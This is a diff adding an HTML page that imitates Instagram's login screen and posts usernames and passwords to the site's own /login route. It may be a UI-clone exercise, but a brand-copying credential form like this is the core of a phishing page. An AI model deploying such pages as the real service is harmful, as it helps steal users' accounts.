@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    <style>
+        .instagram-font {
+            font-family: 'Grand Hotel', cursive;
+        }
+    </style>
+</head>
+<body class="bg-black min-h-screen flex items-center justify-center">
+    <div class="w-full max-w-md p-8">
+        <div class="bg-black p-8 rounded-lg text-center">
+            <h1 class="instagram-font text-white text-5xl mb-8">Instagram</h1>
+            <form action="/login" method="POST" class="space-y-4">
+                <input type="text" name="username" placeholder="Phone number, username or email address" 
+                    class="w-full p-3 rounded bg-zinc-800 text-white border border-zinc-700 focus:outline-none focus:border-zinc-600">
+                <input type="password" name="password" placeholder="Password" 
+                    class="w-full p-3 rounded bg-zinc-800 text-white border border-zinc-700 focus:outline-none focus:border-zinc-600">
+                <button type="submit" 
+                    class="w-full bg-blue-500 text-white py-2 rounded font-semibold hover:bg-blue-600 transition duration-200">
+                    Log in
+                </button>
+            </form>
+            <div class="mt-4">
+                <a href="/forgot-password" class="text-sm text-blue-500 hover:underline">Forgotten your password?</a>
+            </div>
+            <div class="mt-4 text-white">
+                Don't have an account? 
+                <a href="/signup" class="text-blue-500 hover:underline">Sign up</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
